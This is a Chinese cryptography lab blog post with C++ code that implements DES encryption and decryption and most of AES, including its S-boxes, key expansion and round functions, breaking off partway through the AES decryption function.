[{"title":"密码学实验","url":"/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/","content":"DES\n#include &lt;bits/stdc++.h&gt;\nusing namespace std;\nstring string_to_hex(const string&amp; str) //字符串转化为十六进制\n{\n    string result=\"\";\n    string tmp;\n    stringstream ss;\n    for(int i=0;i&lt;str.size();i++)\n    {\n        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;\n        ss&gt;&gt;tmp;\n        result+=tmp;\n    }\n    return result;\n}\nstring hex_to_string(const std::string&amp; str)\n{\n    std::string result;\n    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符\n    {\n        std::string byte = str.substr(i, 2);//每次切两个字符\n        //将十六进制的string转成long再强转成int再转成char\n        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);\n        result.push_back(chr);//将处理完的字符压入result中\n    }\n    return result;\n}\n\nstring hex2bin(string s)\n{\n    //十六进制转化为二进制\n    unordered_map&lt;char, string&gt; mp;\n    mp['0'] = \"0000\";\n    mp['1'] = \"0001\";\n    mp['2'] = \"0010\";\n    mp['3'] = \"0011\";\n    mp['4'] = \"0100\";\n    mp['5'] = \"0101\";\n    mp['6'] = \"0110\";\n    mp['7'] = \"0111\";\n    mp['8'] = \"1000\";\n    mp['9'] = \"1001\";\n    mp['A'] = \"1010\";\n    mp['B'] = \"1011\";\n    mp['C'] = \"1100\";\n    mp['D'] = \"1101\";\n    mp['E'] = \"1110\";\n    mp['F'] = \"1111\";\n    string bin = \"\";\n    for (int i = 0; i &lt; s.size(); i++) {\n        bin += mp[s[i]];\n    }\n    return bin;\n}\nstring bin2hex(string s)\n{\n    // 二进制转化为16进制\n    unordered_map&lt;string, string&gt; mp;\n    mp[\"0000\"] = \"0\";\n    mp[\"0001\"] = \"1\";\n    mp[\"0010\"] = \"2\";\n    mp[\"0011\"] = \"3\";\n    mp[\"0100\"] = \"4\";\n    mp[\"0101\"] = \"5\";\n    mp[\"0110\"] = \"6\";\n    mp[\"0111\"] = \"7\";\n    mp[\"1000\"] = \"8\";\n    mp[\"1001\"] = \"9\";\n    mp[\"1010\"] = \"A\";\n    mp[\"1011\"] = \"B\";\n    mp[\"1100\"] = \"C\";\n    mp[\"1101\"] = \"D\";\n    mp[\"1110\"] = \"E\";\n    mp[\"1111\"] = \"F\";\n    string hex = \"\";\n    for (int i = 0; i &lt; s.length(); i += 4) {\n        string ch = \"\";\n        ch += s[i];\n        ch += s[i + 1];\n        ch += s[i + 2];\n        ch += s[i + 3];\n        hex += mp[ch];\n    }\n    return hex;\n}\n\nstring permute(string k, int* arr, int n)\n{\n    string per = \"\";\n    for (int i = 0; i &lt; n; i++) {\n        per += k[arr[i] - 1];\n    }\n    return per;\n}\n\nstring shift_left(string k, int shifts)\n{\n    string s = \"\";\n    for (int i = 0; i &lt; shifts; i++) {\n        for (int j = 1; j &lt; 28; j++) {\n            s += k[j];\n        }\n        s += k[0];\n        k = s;\n        s = \"\";\n    }\n    return k;\n}\n\nstring xor_(string a, string b)\n{\n    string ans = \"\";\n    for (int i = 0; i &lt; a.size(); i++) {\n        if (a[i] == b[i]) {\n            ans += \"0\";\n        }\n        else {\n            ans += \"1\";\n        }\n    }\n    return ans;\n}\nstring encrypt(string pt, vector&lt;string&gt; rkb,\n               vector&lt;string&gt; rk)\n{\n    // 16-&gt;2\n    pt = hex2bin(pt);\n\n    // 初始置换\n    int initial_perm[64]\n            = { 58, 50, 42, 34, 26, 18, 10, 2,  60, 52, 44,\n                36, 28, 20, 12, 4,  62, 54, 46, 38, 30, 22,\n                14, 6,  64, 56, 48, 40, 32, 24, 16, 8,  57,\n                49, 41, 33, 25, 17, 9,  1,  59, 51, 43, 35,\n                27, 19, 11, 3,  61, 53, 45, 37, 29, 21, 13,\n                5,  63, 55, 47, 39, 31, 23, 15, 7 };\n    // 初始置换\n    pt = permute(pt, initial_perm, 64);\n    cout &lt;&lt; \"初始置换后: \" &lt;&lt; bin2hex(pt)\n         &lt;&lt; endl;\n\n    // 拆分成左右32比特\n    string left = pt.substr(0, 32);\n    string right = pt.substr(32, 32);\n    cout &lt;&lt; \"拆分后: L0=\" &lt;&lt; bin2hex(left)\n         &lt;&lt; \" R0=\" &lt;&lt; bin2hex(right) &lt;&lt; endl;\n\n    // E盒扩展\n    int exp_d[48]\n            = { 32, 1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,\n                8,  9,  10, 11, 12, 13, 12, 13, 14, 15, 16, 17,\n                16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,\n                24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 };\n\n    // S盒\n    int s[8][4][16] = {\n            { 14, 4,  13, 1, 2,  15, 11, 8,  3,  10, 6,  12, 5,9,  0,  7,  0, 15, 7,  4,  14, 2,  13, 1,  10, 6,12, 11, 9,  5, 3,  8,  4,  1,  14, 8,  13, 6,  2, 11, 15, 12, 9, 7,  3,  10, 5,  0,  15, 12, 8,  2, 4,  9,  1,  7, 5,  11, 3,  14, 10, 0,  6,  13 },\n            { 15, 1,  8,  14, 6,  11, 3, 4,  9,  7,  2,  13, 12, 0,  5,  10, 3,  13, 4,  7, 15, 2,  8,  14, 12, 0, 1,  10, 6,  9,  11, 5,  0, 14, 7,  11, 10, 4,  13, 1,  5,  8,  12, 6,  9,  3, 2,  15, 13, 8,  10, 1, 3,  15, 4,  2,  11, 6,  7, 12, 0,  5,  14, 9 },\n\t\t\t{ 10, 0,  9,  14, 6,  3,  15, 5,  1,  13, 12, 7,  11, 4,  2,  8,  13, 7,  0,  9,  3,  4, 6,  10, 2,  8,  5,  14, 12, 11, 15, 1,  13, 6,  4,  9,  8,  15, 3,  0,  11, 1,  2,  12, 5,  10, 14, 7,  1,  10, 13, 0,  6,  9,  8, 7,  4,  15, 14, 3,  11, 5,  2,  12 },\n            { 7,  13, 14, 3,  0,  6,  9,  10, 1,  2, 8,  5,  11, 12, 4,  15, 13, 8,  11, 5,  6,  15, 0, 3,  4,  7, 2,  12, 1,  10, 14, 9,  10, 6,  9,  0, 12, 11, 7, 13, 15, 1,  3,  14, 5,  2,  8,  4,  3, 15, 0,  6, 10, 1,  13, 8,  9,  4,  5,  11, 12, 7, 2,  14 },\n            { 2,  12, 4, 1,  7,  10, 11, 6, 8,  5,  3,  15, 13, 0,  14, 9, 14, 11, 2,  12, 4, 7,  13, 1,  5,  0, 15, 10, 3, 9,  8,  6,  4,  2, 1,  11, 10, 13, 7, 8,  15, 9, 12, 5,  6,  3,  0, 14, 11, 8,  12, 7, 1,  14, 2, 13, 6,  15, 0,  9, 10, 4,  5,  3 },\n            { 12, 1,  10, 15, 9,  2,  6,  8,  0,  13, 3, 4, 14, 7,  5,  11, 10, 15, 4,  2,  7,  12, 9,  5, 6, 1, 13, 14, 0,  11, 3,  8,  9,  14, 15, 5,  2, 8, 12, 3,  7,  0,  4,  10, 1,  13, 11, 6,  4,  3, 2, 12, 9,  5,  15, 10, 11, 14, 1,  7,  6,  0,  8, 13 },\n            { 4,  11, 2,  14, 15, 0,  8, 13, 3,  12, 9,  7,  5,  10, 6,  1,  13, 0,  11, 7, 4,  9,  1,  10, 14, 3, 5,  12, 2,  15, 8,  6,  1, 4,  11, 13, 12, 3,  7, 14, 10, 15, 6,  8,  0,  5, 9,  2,  6,  11, 13, 8, 1,  4,  10, 7,  9,  5,  0, 15, 14, 2,  3,  12 },\n            { 13, 2,  8, 4,  6,  15, 11, 1,  10, 9, 3, 14, 5, 0,  12, 7, 1,  15, 13, 8,  10, 3,  7, 4, 12, 5, 6,  11, 0, 14, 9,  2,  7,  11, 4,  1, 9, 12, 14, 2,  0,  6, 10, 13, 15, 3,  5,  8,  2, 1, 14, 7, 4,  10, 8, 13, 15, 12, 9,  0,  3,  5, 6, 11 }\n    };\n\n    // P盒置换\n    int per[32]\n            = { 16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23,\n                26, 5, 18, 31, 10, 2,  8,  24, 14, 32, 27,\n                3,  9, 19, 13, 30, 6,  22, 11, 4,  25 };\n\n    cout &lt;&lt; endl;\n    for (int i = 0; i &lt; 16; i++) {\n        string right_expanded = permute(right, exp_d, 48);\n\n        string x = xor_(rkb[i], right_expanded);\n\n        // S\n        string op = \"\";\n        for (int i = 0; i &lt; 8; i++) {\n            int row = 2 * int(x[i * 6] - '0')\n                      + int(x[i * 6 + 5] - '0');\n            int col = 8 * int(x[i * 6 + 1] - '0')\n                      + 4 * int(x[i * 6 + 2] - '0')\n                      + 2 * int(x[i * 6 + 3] - '0')\n                      + int(x[i * 6 + 4] - '0');\n            int val = s[i][row][col];\n            op += char(val / 8 + '0');\n            val = val % 8;\n            op += char(val / 4 + '0');\n            val = val % 4;\n            op += char(val / 2 + '0');\n            val = val % 2;\n            op += char(val + '0');\n        }\n        op = permute(op, per, 32);\n\n        x = xor_(op, left);\n\n        left = x;\n\n        // 交换左右\n        if (i != 15) {\n            swap(left, right);\n        }\n        cout &lt;&lt; \"轮数: \" &lt;&lt; i + 1 &lt;&lt; \" \" &lt;&lt; bin2hex(left)\n             &lt;&lt; \" \" &lt;&lt; bin2hex(right) &lt;&lt; \" \" &lt;&lt; rk[i]\n             &lt;&lt; endl;\n    }\n\n    // 左右结合\n    string combine = left + right;\n\n    // IP逆置换\n    int final_perm[64]\n            = { 40, 8,  48, 16, 56, 24, 64, 32, 39, 7,  47,\n                15, 55, 23, 63, 31, 38, 6,  46, 14, 54, 22,\n                62, 30, 37, 5,  45, 13, 53, 21, 61, 29, 36,\n                4,  44, 12, 52, 20, 60, 28, 35, 3,  43, 11,\n                51, 19, 59, 27, 34, 2,  42, 10, 50, 18, 58,\n                26, 33, 1,  41, 9,  49, 17, 57, 25 };\n\n    string cipher = bin2hex(permute(combine, final_perm, 64));\n    return cipher;\n}\n\nint main()\n{\n    string pt, key;\n    cout&lt;&lt;\"请输入明文: \";\n    cin&gt;&gt;pt;\n    cout&lt;&lt;\"请输入密文: \";\n    cin&gt;&gt;key;\n    pt = string_to_hex(pt);\n    cout&lt;&lt;pt;\n    key = string_to_hex(key);\n    key = hex2bin(key);\n    int keyp[56]\n            = { 57, 49, 41, 33, 25, 17, 9,  1,  58, 50, 42, 34,\n                26, 18, 10, 2,  59, 51, 43, 35, 27, 19, 11, 3,\n                60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7,\n                62, 54, 46, 38, 30, 22, 14, 6,  61, 53, 45, 37,\n                29, 21, 13, 5,  28, 20, 12, 4 };\n\n    //密钥生成\n    key = permute(key, keyp, 56);\n\n    int shift_table[16] = { 1, 1, 2, 2, 2, 2, 2, 2,\n                            1, 2, 2, 2, 2, 2, 2, 1 };\n\n    int key_comp[48] = { 14, 17, 11, 24, 1,  5,  3,  28,\n                         15, 6,  21, 10, 23, 19, 12, 4,\n                         26, 8,  16, 7,  27, 20, 13, 2,\n                         41, 52, 31, 37, 47, 55, 30, 40,\n                         51, 45, 33, 48, 44, 49, 39, 56,\n                         34, 53, 46, 42, 50, 36, 29, 32 };\n    string left = key.substr(0, 28);\n    string right = key.substr(28, 28);\n\n    vector&lt;string&gt; rkb;\n    vector&lt;string&gt; rk;\n    for (int i = 0; i &lt; 16; i++) {\n        left = shift_left(left, shift_table[i]);\n        right = shift_left(right, shift_table[i]);\n\n        string combine = left + right;\n\n        string RoundKey = permute(combine, key_comp, 48);\n\n        rkb.push_back(RoundKey);\n        rk.push_back(bin2hex(RoundKey));\n    }\n\n    cout &lt;&lt; \"加密:\\n\";\n    string cipher = encrypt(pt, rkb, rk);\n    cout &lt;&lt; \"密文: \" &lt;&lt; cipher &lt;&lt; endl;\n\n    cout &lt;&lt; \"解密:\\n\";\n    reverse(rkb.begin(), rkb.end());\n    reverse(rk.begin(), rk.end());\n    string text = encrypt(cipher, rkb, rk);\n    text = hex_to_string(text);\n    cout &lt;&lt; \"明文: \" &lt;&lt; text &lt;&lt; endl;\n}\n\nAES\n#include &lt;iostream&gt;\n#include &lt;bits/stdc++.h&gt;\n#include &lt;stdint.h&gt;\n#include&lt;iomanip&gt;\nvoid AddRoundKey(uint8_t mtx[],uint32_t w[]);\nuint32_t SubKeys(uint32_t temp);\nvoid SubBytes(uint8_t mtx[],int len);\nvoid KeyExpansion(uint8_t key[], uint32_t new_key[]);\nvoid Display(uint8_t Matrix[]);\nvoid DisplayKeys(uint8_t Matrix[][16]);\nuint32_t left_bit_move(uint32_t val, int n);\nusing namespace std;\nuint32_t T[4][256];//存储4张列混淆表\nint mixCol[4][4] = {\n        {0x02, 0x03, 0x01, 0x01},\n        {0x01, 0x02, 0x03, 0x01},\n        {0x01, 0x01, 0x02, 0x03},\n        {0x03, 0x01, 0x01, 0x02}\n};//列混淆矩阵\nuint8_t S_Box[16][16] =\n        {\n                {0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76},\n                {0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0},\n                {0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15},\n                {0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75},\n                {0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84},\n                {0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF},\n                {0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8},\n                {0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2},\n                {0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73},\n                {0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB},\n                {0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79},\n                {0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08},\n                {0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A},\n                {0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E},\n                {0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF},\n                {0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}\n        };\n//逆S盒\nuint8_t Inv_S_Box[16][16] =\n        {\n                {0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB},\n                {0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB},\n                {0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E},\n                {0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25},\n                {0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92},\n                {0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84},\n                {0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06},\n                {0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B},\n                {0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73},\n                {0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E},\n                {0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B},\n                {0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4},\n                {0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F},\n                {0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF},\n                {0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61},\n                {0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D}\n        };\n//轮密钥加\nuint32_t LunMiYaoJia[10] = {0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,\n                            0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000};\nuint32_t left_bit_move(uint32_t val, int n) {\n    uint32_t size = sizeof(val) * 8;\n    n = n % size;\n    return (val &gt;&gt; (size - n) | (val &lt;&lt; n));//左移\n    //return (val &lt;&lt; (size - n) | (val &gt;&gt; n));//右移\n}\nstring string_to_hex(const string&amp; str) //字符串转化为十六进制\n{\n    string result=\"\";\n    string tmp;\n    stringstream ss;\n    for(int i=0;i&lt;str.size();i++)\n    {\n        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;\n        ss&gt;&gt;tmp;\n        result+=tmp;\n    }\n    return result;\n}\nstring hex_to_string(const std::string&amp; str)\n{\n    std::string result;\n    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符\n    {\n        std::string byte = str.substr(i, 2);//每次切两个字符\n        //将十六进制的string转成long再强转成int再转成char\n        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);\n        result.push_back(chr);//将处理完的字符压入result中\n    }\n    return result;\n}\n//制作列混淆表\nuint8_t Mul_02(uint8_t x)\n{\n    if((x&gt;&gt;7) == 0)\n        return x&lt;&lt;1;\n    else\n        return ((x&lt;&lt;1)^0x1b)&amp;0xff;\n}\nuint32_t get_output_col1(uint8_t x)\n{\n    x = (uint32_t)x;\n    return (Mul_02(x)&lt;&lt;24)|(x&lt;&lt;16)|(x&lt;&lt;8)|(x^ Mul_02(x));\n    //2113\n}\n\nuint32_t get_output_col2(uint8_t x)\n{\n    x = (uint32_t)x;\n    return ((x^Mul_02(x))&lt;&lt;24)|(Mul_02(x)&lt;&lt;16)|(x&lt;&lt;8)|(x);\n    //3211\n}\nuint32_t get_output_col3(uint8_t x)\n{\n    x = (uint32_t)x;\n    return (x&lt;&lt;24)|((x^Mul_02(x))&lt;&lt;16)|(Mul_02(x)&lt;&lt;8)|(x);\n    //1321\n}\nuint32_t get_output_col4(uint8_t x)\n{\n    x = (uint32_t)x;\n    return (x&lt;&lt;24)|(x&lt;&lt;16)|((x^Mul_02(x))&lt;&lt;8)|(Mul_02(x));\n    //1132\n}\nvoid get_TAB()\n{\n    for(int i=0;i&lt;4;i++) {\n        for (int j = 0; j &lt; 256; j++) {\n            T[i][j]=0;\n        }\n    }\n    for(int i=0;i&lt;256;i++) {\n        T[0][i] = get_output_col1((uint8_t) i);\n        T[1][i] = get_output_col2((uint8_t) i);\n        T[2][i] = get_output_col3((uint8_t) i);\n        T[3][i] = get_output_col4((uint8_t) i);\n    }\n    //输出列混淆表\n//    for(int i=0;i&lt;4;i++) {\n//        for (int j = 0; j &lt; 256; j++) {\n//            //printf(\"%8x \",T[i][j]);\n//            cout &lt;&lt;setw(8)&lt;&lt;setfill('0')&lt;&lt; hex &lt;&lt; T[i][j] &lt;&lt; \" \";\n//        }\n//        cout&lt;&lt;endl;\n//    }\n}\n\nuint8_t GFMul(uint8_t a, uint8_t b) {\n    uint8_t p = 0;\n    uint8_t high;\n    for (int counter = 0; counter &lt; 8; counter++)\n    {\n        if ((b &amp; uint8_t(1)) != 0){//判断当前b的最后一位是否为0\n            p ^= a;}// p与a异或  即如果b当前最后一位不是0，就加上现在的a\n        high = (uint8_t) (a &amp; uint8_t(0x80));//高4位，看是否会溢出，high=1就是溢出\n        a &lt;&lt;= 1;//a左移一位，即乘以2\n        if (high != 0){//发生溢出\n            a ^= 0x1b; }// x^8 + x^4 + x^3 + x + 1\n        b &gt;&gt;= 1;//右移，看b的下一位了\n\n    }\n    return p;\n}\n\nvoid KeyExpansion(uint8_t key[], uint32_t w[])\n{\n    int j=0;\n    uint32_t temp=0;\n    // w[]的前4个就是输入的key\n    //初始化w[0]-&gt;w[3]\n    for(int i=0; i&lt;4;i++){\n        w[i] = (key[4*i]&lt;&lt;24)|(key[4*i+1]&lt;&lt;16)|(key[4*i+2]&lt;&lt;8)|(key[4*i+3]);\n        //printf(\"%d:%x\\n\",i,w[i]);\n    }\n    //创建w[4]-&gt;w[43]\n    for(int i=4; i&lt;44;i++){\n        if(i%4==0){\n            temp = left_bit_move(w[i-1],8);//循环左移8位\n            temp =  SubKeys(temp);\n            w[i] = temp ^ w[i-4] ^ LunMiYaoJia[j++];\n            //printf(\"%d:%x\\n\",i,w[i]);\n        }\n        else {\n            w[i] = w[i - 1] ^ w[i - 4];\n            //printf(\"%d:%x\\n\",i,w[i]);\n        }\n    }\n}\n\nvoid AddRoundKey(uint8_t mtx[],uint32_t w[])\n{\n\n    for(int i=0; i&lt;4; i++){\n        uint8_t w1 = w[i] &gt;&gt; 24 &amp; 0xff;\n        uint8_t w2 = (w[i] &gt;&gt; 16) &amp; 0xff;\n        uint8_t w3 = (w[i] &gt;&gt; 8) &amp; 0xff;\n        uint8_t w4 = (w[i]) &amp; 0xff;\n        mtx[i] ^= w1;  //按列异或\n        mtx[i+4] ^= w2;\n        mtx[i+8] ^= w3;\n        mtx[i+12] ^= w4;\n    }\n}\n\n//  S盒密钥变换 - 前4位为行号，后4位为列号\nuint32_t SubKeys(uint32_t temp)\n{\n    uint8_t w[4] = {0};\n    int j=0;\n    //循环4次\n    for(int i=3; i&gt;=0; i--){\n        w[j++] = (temp&gt;&gt;(i*8))&amp;0xff;\n    }\n    SubBytes(w,4);\n    return (w[0]&lt;&lt;24|w[1]&lt;&lt;16|w[2]&lt;&lt;8|w[3]);\n}\n\n//  S盒变换 - 前4位为行号，后4位为列号\nvoid SubBytes(uint8_t mtx[],int len)\n{\n    for(int i=0; i&lt;len; ++i)\n    {\n        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行\n        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列\n        mtx[i] = S_Box[row][col];\n    }\n}\nvoid InvSubBytes(uint8_t mtx[],int len)\n{\n    for(int i=0; i&lt;len; ++i)\n    {\n        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行\n        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列\n        mtx[i] = Inv_S_Box[row][col];\n    }\n}\n//行移位\nvoid ShiftRows(uint8_t mtx[])\n{\n    uint8_t temp=mtx[4];\n    //第二行左移一位\n    for(int i=0; i&lt;3; i++){\n        mtx[i+4] = mtx[i+5];\n    }\n    mtx[7] = temp;\n    //第三行左移二位\n    for(int i=0; i&lt;2; i++){\n        temp = mtx[i+8];\n        mtx[i+8] = mtx[i+10];\n        mtx[i+10] = temp;\n    }\n    //第四行左移三位\n    temp = mtx[15];\n    for(int i=3; i&gt;0; i--) {\n        mtx[i + 12] = mtx[i + 11];\n    }\n    mtx[12] = temp;\n}\n\nvoid InvShiftRows(uint8_t mtx[])\n{\n    // 第二行循环右移一位\n    uint8_t temp = mtx[7];\n    for(int i=3; i&gt;0; --i)\n        mtx[i+4] = mtx[i+3];\n    mtx[4] = temp;\n    // 第三行循环右移两位\n    for(int i=0; i&lt;2; ++i)\n    {\n        temp = mtx[i+8];\n        mtx[i+8] = mtx[i+10];\n        mtx[i+10] = temp;\n    }\n    // 第四行循环右移三位\n    temp = mtx[12];\n    for(int i=0; i&lt;3; ++i)\n        mtx[i+12] = mtx[i+13];\n    mtx[15] = temp;\n}\n\nvoid MixColumns(uint8_t c[])\n{\n    uint32_t total[4]={0};  //存储每一列取出的4个32比特字节异或的结果，即列混淆后的第i列\n    uint32_t temp[16]={0};  //存储16个 每个字节从T表得到的32比特的4字节一列\n    for(int i=0;i&lt;16;i++){\n        temp[i] = T[i/4][c[i]];\n    }\n\n    for(int i=0; i&lt;4;i++) {\n        total[i] = temp[i] ^ temp[i+4] ^ temp[i+8] ^ temp[i+12];\n        c[i] = (total[i]&gt;&gt;24)&amp;0xff;\n        c[i+4]=(total[i]&gt;&gt;16)&amp;0xff;\n        c[i+8] = (total[i]&gt;&gt;8)&amp;0xff;\n        c[i+12] = (total[i])&amp;0xff;\n    }\n}\nvoid InvMixColumns(uint8_t mtx[])\n{\n    uint8_t arr[4];\n    for(int i=0; i&lt;4; ++i) {\n        for (int j = 0; j &lt; 4; ++j)\n            arr[j] = mtx[i + j * 4];\n\n        mtx[i] = GFMul(0x0e, arr[0]) ^ GFMul(0x0b, arr[1]) ^ GFMul(0x0d, arr[2]) ^ GFMul(0x09, arr[3]);\n        mtx[i + 4] = GFMul(0x09, arr[0]) ^ GFMul(0x0e, arr[1]) ^ GFMul(0x0b, arr[2]) ^ GFMul(0x0d, arr[3]);\n        mtx[i + 8] = GFMul(0x0d, arr[0]) ^ GFMul(0x09, arr[1]) ^ GFMul(0x0e, arr[2]) ^ GFMul(0x0b, arr[3]);\n        mtx[i + 12] = GFMul(0x0b, arr[0]) ^ GFMul(0x0d, arr[1]) ^ GFMul(0x09, arr[2]) ^ GFMul(0x0e, arr[3]);\n    }\n}\n\nvoid Encrypt(uint8_t m[],uint32_t key[],uint8_t c[])\n{\n    //首先进行开始的轮密钥加\n    int round=0;\n    uint32_t w[4]={0};\n    for(int k=0; k&lt;4; k++)\n        w[k] = key[4*round+k];\n    for(int i=0; i&lt;16; i++)\n        c[i] = m[i];\n    AddRoundKey(c,w);\n    //接下来是9轮一摸一样的函数\n    for(int i = 1;i&lt;=9;i++)\n    {\n        SubBytes(c,16);//字节替代\n        ShiftRows(c);//行移位\n        MixColumns(c);//列混淆\n        round++;\n        //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;\n        for(int k=0; k&lt;4; k++) {\n            w[k] = key[4 * round + k];\n        }\n        AddRoundKey(c,w);//轮密钥加\n    }\n    //最后一轮\n    round++;\n    //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;\n    for(int k=0; k&lt;4; k++) {\n        w[k] = key[4 * round + k];\n        //(\"%x \",w[k]);\n    }\n    SubBytes(c,16);//字节替代\n    ShiftRows(c);//行移位\n    AddRoundKey(c,w);//轮密钥加\n}\nvoid Decrypt(uint8_t c[],uint32_t key[],uint8_t m[])\n{\n    //首先进行开始的轮密钥加\n    //注意密钥反着来\n    int round=10;\n    uint32_t 